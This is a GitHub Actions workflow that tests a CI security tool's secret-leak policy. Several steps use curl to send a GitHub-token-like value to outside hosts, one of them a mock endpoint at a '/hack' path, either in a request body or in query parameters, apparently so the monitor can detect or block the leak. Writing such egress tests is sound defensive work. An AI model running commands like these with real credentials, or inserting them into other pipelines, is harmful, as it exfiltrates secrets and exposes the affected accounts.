name: Secret Leak Policy Test

on:
  workflow_dispatch:

permissions:
  actions: read
  checks: write
  contents: read

jobs:
  secret-leak-policy-test:
    runs-on: ubuntu-latest
    name: Test Secret Leak Policy

    steps:
      - name: Setup PSE
        continue-on-error: true
        uses: invisirisk/pse-action@latest
        with:
          api_url: "https://app.invisirisk.com"
          app_token: ${{ secrets.IR_TEST }}

      - name: Secret leak in request body
        continue-on-error: true
        run: |
          curl -k -X PUSH "https://vbirmock.free.beeceptor.com/hack" \
            -H "Content-Type: application/json" \
            -d '{
              "GH": "ghp_DEFzmg7RHrQ2eMe2IF4NxNWQodYpab3VMXXX"
            }'

      - name: Secret leak in query parameter
        continue-on-error: true
        run: >-
          curl
          "https://api.veribom.com/graphql?GH=ghp_DEFzmg7RHrQ2eMe2IF4NxNWQodYpab3VMXXX"

      - name: Masked secret in query parameter
        continue-on-error: true
        run: >-
          curl
          "https://api.veribom.com/graphql?GH=ghp_XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX"

      - name: Confirm workflow continued
        run: echo "Secret Leak policy requests completed or were blocked as expected."
